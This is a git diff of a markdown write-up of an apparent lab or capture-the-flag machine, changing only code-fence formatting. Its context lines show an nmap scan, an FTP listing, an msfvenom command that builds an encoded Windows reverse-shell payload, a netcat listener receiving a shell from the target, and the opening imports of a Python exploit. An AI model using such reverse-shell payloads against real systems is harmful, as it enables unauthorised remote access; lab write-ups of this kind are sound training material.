@@ -1,5 +1,5 @@
 ## nmap -sVC -A 10.10.163.29
-```
+```bash
 Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-16 12:05 EET
 Nmap scan report for 10.10.163.29
 Host is up (0.0044s latency).
@@ -70,7 +70,7 @@ HOP RTT     ADDRESS
 OS and Service detection performed. Please report any inc
 ``` 
 ## ftp 10.10.163.29
-```
+```bash
 ftp> dir
 200 PORT command successful.
 08-29-19  08:36PM       <DIR>          chatserver
@@ -132,7 +132,7 @@ Log data, item 11
 ### msfvenom -p windows/shell_reverse_tcp LHOST=10.2.92.176  LPORT=5555 -e x86/shikata_ga_nai -f py -v shell -b "\x00"
 
 ## Exploit
-```
+```bash
 root@kali:~# nc -nlvp 5555
 listening on [any] 5555 ...
 connect to [10.2.92.176] from (UNKNOWN) [10.10.163.29] 49159
@@ -192,8 +192,8 @@ type root.txt
 
 
 
-#Exploit Code
-```
+# Exploit Code
+```python
 import socket
 import sys
 import os
